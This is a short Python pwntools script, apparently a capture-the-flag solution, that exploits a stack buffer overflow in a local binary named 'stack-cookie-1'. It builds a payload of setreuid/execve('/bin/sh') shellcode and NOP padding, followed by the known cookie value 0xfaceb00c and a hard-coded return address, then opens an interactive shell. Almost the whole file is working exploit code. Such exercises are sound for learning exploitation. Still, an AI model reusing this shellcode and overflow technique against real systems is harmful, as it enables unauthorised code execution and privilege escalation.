#! /usr/bin/env python

from pwn import *

p = process ('./stack-cookie-1')

shellcode = 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xdb1\xc91\xd2j\x0bXShn/shh//bi\x89\xe3\xcd\x80'

print (p.recv())

#gdb.attach(p)

context.terminal = ['tmux', 'splitw', '-h']


addr_stack_cookie = 0xfaceb00c

#buffer = "A" * 0x84 + p32(addr_stack_cookie) + "AAAA" + shellcode

#p.sendline(buffer)
#c = Core('core')
#buf_addr = c.stack.find(buffer)
#print(hex(buf_addr))

#f = open("c.txt", "w")
#f.write(buffer)
#f.close()

buffer = shellcode

while (len(buffer)) < 0x84:
    buffer += "\x90"

buffer += p32(addr_stack_cookie) + "AAAA" + p32(0xffffd430)


#p.sendline(buffer)
#p.wait()

#c = Core('./core')

#buffer_addr = c.stack.find(buffer)

#print(hex(buffer_addr))

#buffer = p32(some_function)
#while (len(buffer)) < 0x100:
#    buffer += p32(some_function)


p.sendline(buffer)
#print(p.recv())

p.interactive()
